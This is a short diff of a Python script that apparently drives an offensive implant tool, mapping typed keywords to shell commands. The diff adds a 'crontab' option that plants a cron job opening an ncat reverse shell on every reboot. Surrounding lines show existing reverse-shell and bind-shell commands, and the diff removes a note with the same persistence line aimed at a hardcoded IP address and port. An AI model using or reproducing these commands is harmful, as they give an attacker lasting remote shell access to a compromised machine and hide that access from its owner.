@@ -77,6 +77,10 @@ if __name__ == "__main__":
             elif "reverse" == user_input :
                 user_input = "bash -c 'nohup ncat %s %s -e $SHELL &'" % (results.host, results.port)
 
+            # Crontab Linux
+            elif "crontab" == user_input :
+                user_input = "bash -c '(crontab -l ; echo \"@reboot sleep 200 && ncat %s %s -e /bin/bash\")|crontab 2> /dev/null'" % (results.host, results.port)
+
             # Bind Shell Linux
             elif "bind" == user_input:
                 user_input = "bash -c 'nohup ncat -lvp %s -e $SHELL -k &'" % (results.port)
@@ -138,13 +142,6 @@ if __name__ == "__main__":
 
 """
 export un binary with mapping FR: 2.7.51-ESP_Code.ino.french.bin
-empire bug
-refactor:
-
-crontab:
-(crontab -l ; echo "@reboot sleep 200 && ncat 92.222.81.2 4242 -e /bin/bash")|crontab 2> /dev/null
-
-
 TODO change_ssid_name
 TODO change_ssid_pass
 TODO update_firmware
